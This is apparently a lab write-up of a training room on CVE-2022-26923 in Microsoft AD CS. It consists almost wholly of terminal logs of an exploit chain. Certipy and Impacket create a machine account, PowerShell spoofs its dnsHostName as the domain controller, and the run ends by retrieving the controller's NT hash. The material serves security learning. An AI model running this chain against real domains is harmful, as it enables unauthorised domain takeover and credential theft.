<p>June 24, 2025</p>
<h1>CVE-2022-26923</h1>
<p>Microsoft's Active Directory Certificate Service (AD CS)<br>
It was possible to exploit misconfigured certificate templates for privilege escalation and lateral movement</p>

![image](https://github.com/user-attachments/assets/f447196b-a723-4f5e-b4ed-c986201fcd36)



<br>





```bash
root@ip-10-10-58-10:~# source /root/Rooms/CVE2022-26923/certipy/bin/activate
(certipy) root@ip-10-10-58-10:~# certipy req 'lunar.eruca.com/thm:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template User
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate
[-] Got error: The NETBIOS connection with the remote host timed out.
[-] Use -debug to print a stacktrace
(certipy) root@ip-10-10-58-10:~# certipy req 'lunar.eruca.com/thm:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template User
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate
[*] Successfully requested certificate
[*] Request ID is 22
[*] Got certificate with UPN 'thm@lunar.eruca.com'
[*] Saved certificate and private key to 'thm.pfx'
(certipy) root@ip-10-10-58-10:~# certipy auth -pfx thm.pfx
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[*] Using principal: thm@lunar.eruca.com
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'thm.ccache'
[*] Trying to retrieve NT hash for 'thm'
[*] Got NT hash for 'thm@lunar.eruca.com': 43460d636f269c709b20049cee36ae7a
(certipy) root@ip-10-10-58-10:~# addcomputer.py 'lunar.eruca.com/thm:Password1@' -method LDAPS -computer-name 'THMPC' -computer-pass 'Password1@'
Impacket v0.10.1.dev1 - Copyright 2022 SecureAuth Corporation

[*] Successfully added machine account THMPC$ with password Password1@.
(certipy) root@ip-10-10-58-10:~# certipy req 'lunar.eruca.com/THMPC$:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template Machine
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate
[-] Got error: The NETBIOS connection with the remote host timed out.
[-] Use -debug to print a stacktrace
(certipy) root@ip-10-10-58-10:~# certipy auth -pfx thmpc.pfx
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[-] Got error: [Errno 2] No such file or directory: 'thmpc.pfx'
[-] Use -debug to print a stacktrace
(certipy) root@ip-10-10-58-10:~# ls
burp.json   CVDE-2022-26923  Desktop    Instructions  Postman  Scripts  thinclient_drives  thm.pfx
CTFBuilder  CVE-2022-26923   Downloads  Pictures      Rooms    snap     thm.ccache         Tools
(certipy) root@ip-10-10-58-10:~# certipy auth -pfx thmp.pfx
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[-] Got error: [Errno 2] No such file or directory: 'thmp.pfx'
[-] Use -debug to print a stacktrace
(certipy) root@ip-10-10-58-10:~# certipy req 'lunar.eruca.com/THMPC$:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template Machine
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate
[*] Successfully requested certificate
[*] Request ID is 24
[*] Got certificate with DNS Host Name 'THMPC.lunar.eruca.com'
[*] Saved certificate and private key to 'thmpc.pfx'
(certipy) root@ip-10-10-58-10:~# ls
burp.json   CVDE-2022-26923  Desktop    Instructions  Postman  Scripts  thinclient_drives  thmpc.pfx  Tools
CTFBuilder  CVE-2022-26923   Downloads  Pictures      Rooms    snap     thm.ccache         thm.pfx
(certipy) root@ip-10-10-58-10:~# certipy auth -pfx thmpc.pfx
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[*] Using principal: thmpc$@lunar.eruca.com
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'thmpc.ccache'
[*] Trying to retrieve NT hash for 'thmpc$'
[*] Got NT hash for 'thmpc$@lunar.eruca.com': 43460d636f269c709b20049cee36ae7a
(certipy) root@ip-10-10-58-10:~# certipy req 'lunar.eruca.com/THMPC$:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template Machine
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate
[-] Got error: The NETBIOS connection with the remote host timed out.
[-] Use -debug to print a stacktrace
(certipy) root@ip-10-10-58-10:~# certipy req 'lunar.eruca.com/THMPC$:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template Machine
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate
[*] Successfully requested certificate
[*] Request ID is 26
[*] Got certificate with DNS Host Name 'LUNDC.lunar.eruca.com'
[*] Saved certificate and private key to 'lundc.pfx'
(certipy) root@ip-10-10-58-10:~# certipy auth -pfx lundc.pfx
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[*] Using principal: lundc$@lunar.eruca.com
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'lundc.ccache'
[*] Trying to retrieve NT hash for 'lundc$'
[*] Got NT hash for 'lundc$@lunar.eruca.com': 14fc9b5814def64289bb694f6659c733
(certipy) root@ip-10-10-58-10:~# 
```


```bash
~# ssh lunar.eruca.com\\thm@lundc
The authenticity of host 'lundc (10.10.131.177)' can't be established.
ECDSA key fingerprint is SHA256:HTvSA1Qt987SOP3SRopzSQ22Q8lPttrUzTwuTyGDLck.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'lundc' (ECDSA) to the list of known hosts.
lunar.eruca.com\thm@lundc's password: 

Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

lunar\thm@LUNDC C:\Users\thm>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\thm> Get-ADComputer THMPC -properties dnshostname,serviceprincipalname


DistinguishedName    : CN=THMPC,CN=Computers,DC=lunar,DC=eruca,DC=com
Enabled              : True
Name                 : THMPC
ObjectClass          : computer
ObjectGUID           : e37956af-682a-42b4-9f4f-f555b6612d8e
SamAccountName       : THMPC$
serviceprincipalname : {RestrictedKrbHost/THMPC.lunar.eruca.com,
                       RestrictedKrbHost/THMPC, HOST/THMPC.lunar.eruca.com,
SID                  : S-1-5-21-3330634377-1326264276-632209373-12102
UserPrincipalName    :



PS C:\Users\thm> Set-ADComputer THMPC -ServicePrincipalName @{}
PS C:\Users\thm> Set-ADComputer THMPC -DnsHostName LUNDC.lunar.eruca.com
PS C:\Users\thm> Get-ADComputer THMPC -properties dnshostname,serviceprincipalname


DistinguishedName : CN=THMPC,CN=Computers,DC=lunar,DC=eruca,DC=com
DNSHostName       : LUNDC.lunar.eruca.com
Enabled           : True
Name              : THMPC
ObjectClass       : computer
ObjectGUID        : e37956af-682a-42b4-9f4f-f555b6612d8e
SamAccountName    : THMPC$
SID               : S-1-5-21-3330634377-1326264276-632209373-12102
UserPrincipalName :



PS C:\Users\thm>
```


![image](https://github.com/user-attachments/assets/b48dac05-ccf0-42bd-95d8-35e64c780944)

![image](https://github.com/user-attachments/assets/1dfb44be-3772-4769-931a-99057d6945bf)

<br>

![image](https://github.com/user-attachments/assets/b9851d0a-76df-4812-8188-87e81956ab2a)

![image](https://github.com/user-attachments/assets/4793dd17-db71-4a05-89a9-f0314e4c7aaa)

![image](https://github.com/user-attachments/assets/c32293f2-0ef6-4c96-b17f-46e04bd1439d)

![image](https://github.com/user-attachments/assets/2e31aa61-01ff-4d7f-925e-dc062affa8ce)
